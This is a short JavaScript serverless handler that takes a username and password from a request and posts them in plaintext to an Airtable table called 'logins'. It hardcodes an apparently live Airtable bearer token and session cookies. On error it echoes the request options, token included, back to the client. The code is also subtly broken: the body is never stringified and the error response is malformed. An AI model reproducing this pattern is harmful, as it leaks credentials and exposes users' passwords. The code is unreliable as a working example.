import { json } from 'micro';
export default async function handler(req, res) {
  const data = await json(req)
  const {username, password} = data

  const myHeaders = new Headers();
  myHeaders.append("Authorization", "Bearer patFPAzk3Ni4jtL7K.8bdcda86e17b32bd177f9ab25661e401e4454a8e4a2401a267c36b67e94ea933");
  myHeaders.append("Content-Type", "application/json");
  myHeaders.append("Cookie", "brw=brwtcGK1QAbqebbws; AWSALBTG=G1c/AaFChM68qJ1miOJKA7fGRCNK2TxB1eb/N71cSJlKrRHpHs4skfSztHPIXhc9m32dXm3/SPz3hPcm/M4jvZY4GcPVqDbl5ExnNZCWI1uJ5knMLc8sqrgTgPoSU5fnJo7VLBJj+z4l9eU+SPgHYNs7U5mLI2VvapdPI0L8qBAkp7krtms=; AWSALBTGCORS=G1c/AaFChM68qJ1miOJKA7fGRCNK2TxB1eb/N71cSJlKrRHpHs4skfSztHPIXhc9m32dXm3/SPz3hPcm/M4jvZY4GcPVqDbl5ExnNZCWI1uJ5knMLc8sqrgTgPoSU5fnJo7VLBJj+z4l9eU+SPgHYNs7U5mLI2VvapdPI0L8qBAkp7krtms=");

  const raw = 

      {
        "fields": {
          "username": username,
          "password": password
        }
      };
  

  const requestOptions = {
    method: "POST",
    headers: myHeaders,
    body: raw,
    redirect: "follow"
  };


  try {
    const response = await fetch("https://api.airtable.com/v0/appXXbVu5p4uSKViT/logins", requestOptions);

    // Check if the response is successful (status code 200-299)
    if (!response.ok) {
      const errorData = await response.json();
      return res.status(500).json( "Airtable API Error", errorData, requestOptions, raw );
    }

    const result = await response.json();
    return res.status(200).json({ message: "Account created successfully", data: result });
  } catch (error) {
    console.error("Error:", error);
    return res.status(500).json({ message: "Internal Server Error", error: error.message });
  }
}
